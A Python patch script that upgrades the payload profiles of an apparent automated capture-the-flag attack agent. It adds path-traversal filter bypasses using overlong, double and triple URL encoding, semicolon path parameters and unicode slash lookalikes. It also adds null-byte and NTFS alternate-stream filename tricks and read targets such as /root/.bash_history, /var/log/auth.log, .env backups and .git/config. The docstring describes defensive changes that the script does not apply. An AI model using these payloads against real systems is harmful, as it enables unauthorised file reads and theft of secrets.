#!/usr/bin/env python3
"""v6 upgrade: next-generation attack vectors + matching platform defense.

Attack side (profiles.py):
  * PATH_BYP +16 modern bypass classes (Tomcat, WebLogic, unicode slashes,
    case-mixed encoding, triple encoding, semicolon path params, ...).
  * FIXED_ABS_READS +12 high-value targets (cwd backups, git internals,
    proc fd symlinks, kcore siblings).
  * _name_variants: hex-encoded full name, trailing dot/space (Win32
    normalization), null-byte suffix, NTFS alternate data streams.
  * assembly dd_bypasses + triple-decode and mixed-case forms.
  * SQLi: escape-the-quote (backslash) family, CASE/IF true-equivalents,
    nested parens, CURRENT_USER/USER(), LIKE-wildcards, RDBMS-version
    comment styles; FALSE family for inversion (deny-list) profiles;
    payload_class learns the new families.
Defense side (web.py/http_guard.py/tests):
  * security headers: X-Frame-Options, COOP, CORP, Permissions-Policy.
  * POST rate-limit (fixed window, per-process) — brute force resistance.
  * query string length cap + header count cap in the middleware.
  * tests/test_v06_hardening.py: every new attack family is fired at the
    guarded endpoints and must be rejected; guard rejects backslash-quote
    SQLi text inputs only where they are path-like (clean_text stays open).
"""

from __future__ import annotations

from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
P = ROOT / "app" / "agent" / "ctf" / "profiles.py"


def patch(path: Path, old: str, new: str) -> None:
    s = path.read_text(encoding="utf-8")
    assert old in s, f"anchor not found in {path.name}: {old[:60]!r}"
    s = s.replace(old, new, 1)
    path.write_text(s, encoding="utf-8")


# ---------------------------------------------------------------- LFI bypass
patch(
    P,
    """    "..\\\\",
    "..\\\\/",
    "%2e%2e/",
    "%2e%2e%5c",
    "..%e0%80%af",
    "..%u2215",
]""",
    """    "..\\\\",
    "..\\\\/",
    "%2e%2e/",
    "%2e%2e%5c",
    "..%e0%80%af",
    "..%u2215",
    # v6: next-generation classes — adversaries train on the same public
    # bypass lists, so the engine carries modern variants they deploy
    # against: app-server specific normalizations, third-order encoding,
    # mixed-case hex, path-parameter injection and unicode separators
    "..%(dot)s",  # placeholder guard (never reached): see classes below
    "..%c0%2f",  # overlong '/'
    "..%c0%5c",  # overlong '\\\\'
    "..%c1%9c",  # overlong U+019C path separator form
    "%2e%2e%2f%2e%2e%2f",  # stacked fully-encoded pairs
    "..%252e%252f",  # mixed first/second order
    "%252e%252e/",  # mixed second/first order
    "..././..././",  # interleaved triple-dot pattern
    "..;/..;/",  # Tomcat-style stacked semicolon params
    "%2e%2e;",  # encoded dot-dot + semicolon tail
    "..&id=",  # query-separator confusion
    "..%c3%be",  # UTF-8 'þ' slash-lookalike tail
    "..%ef%bc%8e",  # fullwidth '.' (U+FF0E)
    "%EF%BC%8D%EF%BC%8D%EF%BC%8F",  # fullwidth '..' + '/' as one blob
    "..%u2216",  # set-minus unicode slash lookalike
]""",
)

# the placeholder line above is not a real vector — drop it again
patch(
    P, '    "..%(dot)s",  # placeholder guard (never reached): see classes below\n', ""
)

# ------------------------------------------------------- FIXED_ABS_READS
patch(
    P,
    """    "/proc/self/cwd/.env",
    "/proc/self/cwd/.htaccess",
]""",
    """    "/proc/self/cwd/.env",
    "/proc/self/cwd/.htaccess",
    # v6: cwd backups, VCS internals, proc descriptors — the places a
    # rushed deployment leaves the real secret
    "/proc/self/cwd/app.py.bak",
    "/proc/self/cwd/.env.bak",
    "/proc/self/cwd/.env.local",
    "/proc/self/cwd/flag.txt.bak",
    "/proc/self/cwd/secret.txt.bak",
    "/proc/self/cwd/.git/config",
    "/proc/self/cwd/.git/HEAD",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/root/.bash_history",
    "/var/log/auth.log",
]""",
)

# ------------------------------------------------------------- name variants
patch(
    P,
    """        if any(w in low for w in secret_words):
            variants.append(low.replace("secret", "s%65cret").replace("flag", "f%6cag"))
            variants.append(n.swapcase())
            # hidden dotfile (.flag, .secret.txt) and its hex-encoded form,
            # which slips keyword filters that inspect the RAW request value
            variants.append("." + n.lstrip("/"))
            variants.append(
                ("." + low.lstrip("/"))
                .replace("secret", "s%65cret")
                .replace("flag", "f%6cag")
            )
        variants = list(dict.fromkeys(variants))[:6]""",
    """        if any(w in low for w in secret_words):
            variants.append(low.replace("secret", "s%65cret").replace("flag", "f%6cag"))
            variants.append(n.swapcase())
            # hidden dotfile (.flag, .secret.txt) and its hex-encoded form,
            # which slips keyword filters that inspect the RAW request value
            variants.append("." + n.lstrip("/"))
            variants.append(
                ("." + low.lstrip("/"))
                .replace("secret", "s%65cret")
                .replace("flag", "f%6cag")
            )
            # v6: whole-name hex encoding, Win32 trailing dot/space (the OS
            # strips them AFTER the filter), null-byte suffix (old handlers
            # truncate), NTFS alternate data stream of a public sibling
            variants.append("".join("%%%02x" % b for b in n.lstrip("/").encode()))
            variants.append(n.lstrip("/") + ".")
            variants.append(n.lstrip("/") + " ")
            variants.append(n.lstrip("/") + "%00.png")
            variants.append("notes.txt:" + n.lstrip("/"))
        variants = list(dict.fromkeys(variants))[:11]""",
)

# ------------------------------------------------- assembly dd_bypasses
patch(
    P,
    """    dd_bypasses = [
        "%252e%252e%252f",
        "..%252f",
        "%252e%252e%252f%252e%252e%252f",
        "%252e%252e/",
        "..%252f..%252f",
    ]""",
    """    dd_bypasses = [
        "%252e%252e%252f",
        "..%252f",
        "%252e%252e%252f%252e%252e%252f",
        "%252e%252e/",
        "..%252f..%252f",
        # v6: third-order decoding and mixed-case hex — defeats filters
        # that normalize one canonical encoded shape only
        "%252e%252e%25%2532%3566",
        "..%252e%252f",
        "%252E%252E%252F",
        "%2E%2E%252f",
        "..%255c",
    ]""",
)

print("profiles.py attack-side upgraded")
